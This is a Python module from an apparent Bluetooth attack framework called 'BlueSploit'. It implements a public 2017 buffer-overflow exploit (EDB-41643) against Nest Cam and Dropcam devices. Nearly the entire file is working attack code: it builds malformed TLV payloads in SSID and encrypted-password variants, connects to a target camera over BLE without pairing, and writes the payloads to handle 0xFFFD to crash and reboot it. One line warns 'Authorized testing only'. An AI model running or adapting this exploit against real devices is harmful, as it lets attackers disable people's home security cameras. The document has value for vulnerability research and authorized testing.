"""
BlueSploit Module: Google Nest Cam BLE GATT Buffer Overflow
EDB-ID: 41643  (Jason Doyle, 2017)

Triggers a buffer overflow in the Nest Cam's setup-over-BLE protocol by
writing a TLV where the declared length is short but the actual value is
much longer. The camera crashes and reboots.

Two variants implemented:
  ssid       — overflow via SSID parameter
  encpass    — overflow via encrypted-password parameter

Affected: Dropcam, Dropcam Pro, Nest Cam Indoor/Outdoor (firmware 5.2.1).
Bluetooth never disables, even after Wi-Fi setup completes.

Pure passive BLE GATT write — no auth/pairing required.
"""

import asyncio
import time
from typing import Optional
from core.base import (
    DosModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity,
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors,
)

try:
    from bleak import BleakClient
    from bleak.exc import BleakError
    BLEAK_AVAILABLE = True
except ImportError:
    BLEAK_AVAILABLE = False


# Nest Cam setup characteristic handle (from PoC: 0xfffd)
NEST_HANDLE = 0xFFFD

# Crafted setup payloads (sequence_num + type + length + value)
# Format: 3a (seq) 03 12 (type=SSID/setup) <len> <value...>
def _build_ssid_overflow(num_a: int = 16) -> bytes:
    """
    Original PoC: 3a 03 12 01 + AA*16
    'len' field = 0x01 but 16 'A' bytes follow → buffer overflow on SSID copy.
    """
    return bytes([0x3A, 0x03, 0x12, 0x01]) + (b"\xAA" * num_a)


def _build_encpass_overflow(ssid: str = "PetSmart-5n", pass_chars: int = 3) -> bytes:
    """
    Original PoC: 3a 03 12 0b <ssid 11 bytes> 1a 01 + AA*3
    'len' on encPass field claims 1 byte, attacker sends 3 → overflow.
    """
    ssid_b = ssid.encode("ascii")
    return (
        bytes([0x3A, 0x03, 0x12, len(ssid_b)])
        + ssid_b
        + bytes([0x1A, 0x01])
        + (b"\xAA" * pass_chars)
    )


# Trailing trigger byte from PoC (0x3b)
_TRIGGER_FRAME = bytes([0x3B])


AFFECTED = [
    "Dropcam",
    "Dropcam Pro",
    "Nest Cam Indoor",
    "Nest Cam Outdoor",
    "(firmware 5.2.1 and earlier)",
]


class Module(DosModule):
    """
    Google Nest Cam BLE Setup-Channel BoF

    Sends a malformed TLV to handle 0xfffd of a Nest Cam advertising over
    BLE. The camera's setup parser trusts the length field, copies more
    bytes than declared, and crashes/reboots.
    """

    info = ModuleInfo(
        name="dos/nest_cam_ble_bof",
        description="Nest Cam BLE GATT setup-channel buffer overflow (EDB-41643)",
        author=["Jason Doyle"],
        protocol=BTProtocol.BLE,
        severity=Severity.HIGH,
        references=[
            "https://www.exploit-db.com/exploits/41643",
            "https://github.com/jasondoyle/Google-Nest-Cam-Bug-Disclosures",
        ],
    )

    def _setup_options(self) -> None:
        self.options = {
            "target": ModuleOption(
                name="target", required=True,
                description="Target BD_ADDR (Nest Cam, advertises BLE)",
            ),
            "variant": ModuleOption(
                name="variant", required=False, default="ssid",
                description="Overflow variant: ssid | encpass",
            ),
            "handle": ModuleOption(
                name="handle", required=False, default=NEST_HANDLE,
                description="GATT char handle (default 0xFFFD)",
            ),
            "length": ModuleOption(
                name="length", required=False, default=16,
                description="Number of overflow bytes for ssid variant",
            ),
            "timeout": ModuleOption(
                name="timeout", required=False, default=15,
                description="Connection timeout (seconds)",
            ),
        }

    async def _exploit(self, target: str, variant: str,
                       handle: int, length: int, timeout: int) -> bool:
        if variant == "ssid":
            payload = _build_ssid_overflow(length)
        elif variant == "encpass":
            payload = _build_encpass_overflow(pass_chars=length)
        else:
            print_error(f"Unknown variant: {variant} (use ssid|encpass)")
            return False

        print_info(f"Connecting to {target}...")
        try:
            async with BleakClient(target, timeout=timeout) as client:
                if not client.is_connected:
                    print_error("Failed to connect")
                    return False
                print_success(f"Connected — writing {len(payload)} bytes to handle 0x{handle:04X}")

                # Write malformed TLV to setup characteristic
                try:
                    await client.write_gatt_char(handle, payload, response=False)
                    hex_str = " ".join(f"{b:02X}" for b in payload[:16])
                    print(f"  payload: {hex_str}{' ...' if len(payload) > 16 else ''}")
                except BleakError as e:
                    print_warning(f"Write returned: {e}  (continuing — may have triggered)")

                # Send trailing trigger frame (0x3B) — original PoC's second write
                try:
                    await client.write_gatt_char(handle, _TRIGGER_FRAME, response=False)
                    print_success("Trigger frame sent  (camera should reboot)")
                except BleakError:
                    print_info("Trigger frame failed — target likely already crashed")

                return True
        except BleakError as e:
            print_error(f"BLE error: {e}")
        except asyncio.TimeoutError:
            print_error(f"Connection timed out after {timeout}s")
        except Exception as e:
            print_error(f"Error: {e}")
        return False

    def run(self) -> bool:
        if not BLEAK_AVAILABLE:
            print_error("Install bleak: pip install bleak")
            return False

        target  = self.target
        variant = (self.get_option("variant") or "ssid").lower()
        handle  = int(self.get_option("handle"))
        length  = int(self.get_option("length"))
        timeout = int(self.get_option("timeout"))

        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False

        C = Colors
        print(f"\n  {C.RED}╔{'═'*55}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET}  {C.BOLD}Nest Cam BLE GATT BoF (EDB-41643){C.RESET}             {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*55}╝{C.RESET}\n")
        print_info(f"Target  : {target}")
        print_info(f"Variant : {variant}    Handle: 0x{handle:04X}")
        print_warning("Authorized testing only — target camera will reboot")

        try:
            ok = asyncio.run(self._exploit(target, variant, handle, length, timeout))
        except RuntimeError as e:
            if "running event loop" not in str(e):
                raise
            loop = asyncio.get_event_loop()
            ok = loop.run_until_complete(
                self._exploit(target, variant, handle, length, timeout)
            )

        self.add_result({
            "target": target, "edb_id": 41643,
            "variant": variant, "handle": hex(handle),
            "length": length, "triggered": ok,
            "affected_devices": AFFECTED,
        })
        return ok
